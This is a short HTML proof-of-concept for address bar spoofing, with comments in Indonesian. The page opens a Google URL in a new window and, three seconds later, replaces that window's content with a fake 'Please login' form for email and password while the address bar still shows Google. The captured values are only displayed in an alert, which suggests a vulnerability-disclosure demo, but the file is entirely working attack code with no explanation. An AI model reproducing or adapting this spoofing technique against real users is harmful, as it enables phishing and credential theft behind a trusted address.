<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Bar Spoofing</title>
</head>
<body>
    <button onclick="go()">Go</button>

    <script>
        function go(){
            // Mengganti /csi menjadi /spoof di URL
            var x = window.open('https://www.google.com/csi'); // URL yang sudah diganti

            // Setelah 3 detik, mengganti konten di halaman baru dengan gambar dan form login
            setTimeout(function() {
                x.document.body.innerHTML = `
                    <h1>Please login</h1>
                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/wcAAwAB/74syFgAAAABJRU5ErkJggg==" 
                    alt="Simple Image" style="width:100px;height:100px;">
                    <br><br>
                    Email: <input id="email"><br><br>
                    Pass: <input id="pass" type="password"><br><br>
                    <button onclick="alert('Email: ' + document.getElementById('email').value + '\\nPass: ' + document.getElementById('pass').value)">Login</button>
                `;
            }, 3000); // Menunggu 3 detik sebelum mengganti konten
        }
    </script>
</body>
</html>
